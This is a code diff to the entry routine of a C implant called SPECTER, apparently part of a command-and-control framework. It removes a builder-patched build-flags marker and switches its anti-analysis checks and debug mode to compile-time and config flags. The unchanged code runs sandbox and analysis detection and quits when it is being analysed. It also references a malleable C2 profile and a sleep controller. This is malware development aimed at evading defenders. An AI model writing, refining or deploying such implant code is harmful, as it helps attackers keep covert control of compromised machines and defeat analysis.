@@ -24,23 +24,10 @@
    All subsystems receive a pointer to this via init functions. */
 static IMPLANT_CONTEXT g_ctx;
 
-/* Builder-patchable build flags region.
-   Marker "SPBF" (4 bytes) + 1 byte flags value.
-   The builder locates the marker, patches the flags byte, and scrubs the
-   marker with random bytes.  volatile const prevents the compiler from
-   optimizing away reads or the marker bytes themselves. */
-/* Builder-patchable build flags.
-   volatile prevents constant-folding. We use a simple array without
-   section attributes — the linker script merges .data into .text anyway. */
-static volatile BYTE g_build_flags_region[] = {
-    'S','P','B','F',  /* marker — builder finds and scrubs this */
-    0x00              /* flags byte — builder patches this       */
-};
-
-/* Read the builder-patched build flags (safe to call before cfg_init). */
-static BYTE get_build_flags(void) {
-    return g_build_flags_region[4];
-}
+/* Phase 0.4: Build flags marker (SPBF) removed.
+   Anti-analysis and debug mode are now controlled entirely by compile-time
+   flags (#ifdef SPECTER_DEV_BUILD) and the config TLV field (0x8A BUILD_FLAGS)
+   which is parsed during cfg_init(). */
 
 /* Forward declarations for cleanup */
 static void implant_cleanup(void);
@@ -146,27 +133,20 @@ void implant_entry(PVOID param) {
 
     /* ---- Step 3c: Anti-analysis checks ---- */
     /* Anti-analysis runs BEFORE config is loaded.  The compile-time
-       SPECTER_DEV_BUILD flag and the builder-patchable build_flags
-       region (readable before cfg_init) both gate this check. */
+       SPECTER_DEV_BUILD flag gates this check.  Runtime skip via
+       config BUILD_FLAGS TLV (0x8A) is available after cfg_init. */
+#ifndef SPECTER_DEV_BUILD
     {
-        BOOL skip_aa = FALSE;
-#ifdef SPECTER_DEV_BUILD
-        skip_aa = TRUE;
-#endif
-        if (get_build_flags() & BUILD_FLAG_SKIP_ANTIANALYSIS)
-            skip_aa = TRUE;
-
-        if (!skip_aa) {
-            ANTIANALYSIS_CONFIG aa_cfg;
-            ANALYSIS_RESULT aa_result;
-            antianalysis_default_config(&aa_cfg);
-            ANALYSIS_TYPE aa_type = antianalysis_check(&g_ctx, &aa_cfg, &aa_result);
-            if (aa_type != ANALYSIS_CLEAN) {
-                antianalysis_respond(&g_ctx, aa_cfg.response);
-                return;
-            }
+        ANTIANALYSIS_CONFIG aa_cfg;
+        ANALYSIS_RESULT aa_result;
+        antianalysis_default_config(&aa_cfg);
+        ANALYSIS_TYPE aa_type = antianalysis_check(&g_ctx, &aa_cfg, &aa_result);
+        if (aa_type != ANALYSIS_CLEAN) {
+            antianalysis_respond(&g_ctx, aa_cfg.response);
+            return;
         }
     }
+#endif
 
     /* ---- Step 4: Initialize config store ---- */
     DEV_TRACE("[SPECTER] cfg_init...");
@@ -224,14 +204,12 @@ void implant_entry(PVOID param) {
 
     /* ---- Step 6: Initialize sleep controller ---- */
     /* Skip full sleep init for dev builds or when debug flag is set
-       (runtime check via builder-patchable flags + config build_flags). */
+       (compile-time flag + config BUILD_FLAGS TLV after cfg_init). */
     {
         BOOL skip_sleep_init = FALSE;
 #ifdef SPECTER_DEV_BUILD
         skip_sleep_init = TRUE;
 #endif
-        if (get_build_flags() & BUILD_FLAG_DEBUG)
-            skip_sleep_init = TRUE;
         {
             IMPLANT_CONFIG *scfg = cfg_get(&g_ctx);
             if (scfg && (scfg->build_flags & BUILD_FLAG_DEBUG))
@@ -282,9 +260,9 @@ void implant_entry(PVOID param) {
     }
 
     /* ---- Step 7b: Initialize malleable C2 profile ---- */
-    /* DISABLED: Profile-driven comms path crashes (Phase 0 stabilization).
-       The profile system needs debugging before enabling. Using legacy
-       wire format for all checkins. Re-enable after Phase 1.3 (roadmap). */
+    /* PHASE 0 STABILIZATION: Malleable C2 profile disabled — the profile-driven
+       transform/embed chain crashes under the current comms architecture. Using
+       legacy wire format until Phase 1.3 debugging is complete. See roadmap.md. */
     DEV_TRACE("[SPECTER] profile disabled (Phase 0), using legacy wire format");
 
     /* ---- Step 8: Enter main loop ---- */
@@ -342,8 +320,6 @@ void implant_entry(PVOID param) {
 #ifdef SPECTER_DEV_BUILD
             use_simple_sleep = TRUE;
 #endif
-            if (get_build_flags() & BUILD_FLAG_DEBUG)
-                use_simple_sleep = TRUE;
             {
                 IMPLANT_CONFIG *slp_cfg = cfg_get(&g_ctx);
                 if (slp_cfg && (slp_cfg->build_flags & BUILD_FLAG_DEBUG))
